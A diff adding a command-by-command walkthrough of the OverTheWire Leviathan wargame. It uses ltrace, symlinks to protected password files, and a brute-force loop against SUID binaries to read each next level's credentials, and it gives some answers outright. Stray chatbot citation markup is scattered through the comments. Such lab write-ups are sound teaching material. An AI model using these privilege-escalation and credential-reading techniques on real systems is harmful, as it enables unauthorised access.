@@ -1,0 +1,100 @@
+# Level 0 -> 1
+# Log into the Leviathan server (user leviathan0, password leviathan0)&#8203;:contentReference[oaicite:0]{index=0}.
+ssh leviathan0@leviathan.labs.overthewire.org -p 2223
+# List files (including hidden) to find the .backup directory.
+ls -la
+# Change to the .backup directory to find backup files&#8203;:contentReference[oaicite:1]{index=1}.
+cd .backup/
+# List the contents; we expect a bookmarks.html file with the next password.
+ls -la
+# Search the bookmarks.html for the next level password. 
+cat bookmarks.html | grep password
+
+# Level 1 -> 2
+# Login as leviathan1 (using password found in previous level).
+ssh leviathan1@leviathan.labs.overthewire.org -p 2223
+# List files; note the 'check' executable with SUID bit owned by leviathan2.
+ls -la
+# (Optional) Look for any strings in 'check'; then trace library calls to find password comparison&#8203;:contentReference[oaicite:2]{index=2}.
+strings check
+ltrace ./check
+# Run 'check' and enter the password discovered ('sex') from the ltrace output&#8203;:contentReference[oaicite:3]{index=3}&#8203;:contentReference[oaicite:4]{index=4}.
+./check    # input: sex
+# Confirm we are now leviathan2 (SUID shell) and read the password file for leviathan2&#8203;:contentReference[oaicite:5]{index=5}.
+whoami
+cat /etc/leviathan_pass/leviathan2
+
+# Level 2 -> 3
+# Login as leviathan2 (using password from /etc/leviathan_pass/leviathan2).
+ssh leviathan2@leviathan.labs.overthewire.org -p 2223
+# List files; note the 'printfile' executable owned by leviathan3 (SUID)&#8203;:contentReference[oaicite:6]{index=6}.
+ls -la
+# Create a test directory and file for analysis.
+mkdir /tmp/test
+# Trace what printfile does with a normal file to understand its behavior&#8203;:contentReference[oaicite:7]{index=7}.
+ltrace ~/printfile /tmp/test/test.txt
+# Create a file name with a space to exploit how /bin/cat handles input&#8203;:contentReference[oaicite:8]{index=8}.
+touch "/tmp/test/space test.txt"
+ltrace ~/printfile "/tmp/test/space test.txt"
+# Create a symbolic link named 'space' (the first word in "space test.txt") pointing to leviathan3's password file&#8203;:contentReference[oaicite:9]{index=9}.
+ln -s /etc/leviathan_pass/leviathan3 /tmp/test/space
+# Run printfile on the "space test.txt" to make /bin/cat print leviathan3's password.
+~/printfile "/tmp/test/space test.txt"
+
+# Level 3 -> 4
+# Login as leviathan3 (password from leviathan3's file).
+ssh leviathan3@leviathan.labs.overthewire.org -p 2223
+# List files; note 'level3' executable with SUID bit owned by leviathan4&#8203;:contentReference[oaicite:10]{index=10}.
+ls -la
+# Trace library calls in level3 to find the correct password; it compares input to "snlprintf"&#8203;:contentReference[oaicite:11]{index=11}&#8203;:contentReference[oaicite:12]{index=12}.
+ltrace ./level3
+# Run level3 with the discovered password ("snlprintf") to escalate to leviathan4.
+./level3    # input: snlprintf
+# Confirm we are now leviathan4 and read the password for leviathan4&#8203;:contentReference[oaicite:13]{index=13}.
+whoami
+cat /etc/leviathan_pass/leviathan4
+
+# Level 4 -> 5
+# Login as leviathan4 (password from leviathan4's file).
+ssh leviathan4@leviathan.labs.overthewire.org -p 2223
+# List files; enter the .trash directory which contains a SUID 'bin' file&#8203;:contentReference[oaicite:14]{index=14}.
+ls -la
+cd .trash
+ls -la
+# Run the 'bin' executable to get binary output, which is an ASCII string in binary&#8203;:contentReference[oaicite:15]{index=15}.
+./bin
+# Convert the binary output (ASCII in binary) to text (e.g., using perl). The output is the password for level5&#8203;:contentReference[oaicite:16]{index=16}.
+echo 01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 | perl -lape '$_=pack"(B8)*",@F'
+
+# Level 5 -> 6
+# Login as leviathan5 (password from level5).
+ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+# List files; note 'leviathan5' executable with SUID bit owned by leviathan6&#8203;:contentReference[oaicite:17]{index=17}.
+ls -la
+# Running the executable reports missing /tmp/file.log&#8203;:contentReference[oaicite:18]{index=18}.
+./leviathan5
+# Trace calls to see it tries to open /tmp/file.log&#8203;:contentReference[oaicite:19]{index=19}.
+ltrace ./leviathan5
+# Create a symbolic link /tmp/file.log pointing to leviathan6's password file&#8203;:contentReference[oaicite:20]{index=20}.
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+# Run leviathan5 again; it will print the leviathan6 password.
+./leviathan5
+
+# Level 6 -> 7
+# Login as leviathan6 (password from level6).
+ssh leviathan6@leviathan.labs.overthewire.org -p 2223
+# List files; note 'leviathan6' executable SUID owned by leviathan7&#8203;:contentReference[oaicite:21]{index=21}.
+ls -la
+# Try running with a sample code (1234) to see usage.
+./leviathan6 1234
+# Brute-force the 4-digit code (0000-9999) until the correct one (7123) is found&#8203;:contentReference[oaicite:22]{index=22}.
+for i in {0000..9999}; do echo $i; ./leviathan6 $i; done
+# With the correct code, a shell is spawned as leviathan7; display the password.
+cat /etc/leviathan_pass/leviathan7
+
+# Level 7
+# Login as leviathan7 (password from level7).
+ssh leviathan7@leviathan.labs.overthewire.org -p 2223
+# List files and display the congratulatory message.
+ls -la
+cat CONGRATULATIONS
